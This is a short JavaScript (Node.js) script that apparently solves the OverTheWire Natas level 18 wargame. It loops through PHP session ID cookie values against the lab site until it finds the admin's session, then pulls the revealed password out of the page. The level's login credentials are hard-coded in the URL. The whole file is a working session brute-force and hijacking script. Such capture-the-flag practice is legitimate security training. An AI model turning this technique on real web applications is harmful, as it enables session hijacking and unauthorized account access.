import fetch from 'node-fetch';

let uri = `http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/index.php?debug=true&username=admin&password=foo`;

const maxid = 640;

async function start() {
  for (var i = -1; i < maxid; i++) {
    // console.log("Testing: " + i);
    const body = await runRequest(i);
    if (body.match(/next level/i)) {
      console.log("Found admin session: " + i);
      const password = body.match(/Password:\s([^<]+)/)[1];
      console.log(`Password: ${password}`);
      break;
    }
  }
}

async function runRequest(sessionId) {
  let str = `PHPSESSID=${sessionId}`;
  const headers = {
    Cookie: str
  };
  console.log('Trying uri: '+uri +' with cookie '+str);
  const response = await fetch(uri, {headers})
      .then((response) => response.text());

  // console.log('body', response);
  return response;
}

start();
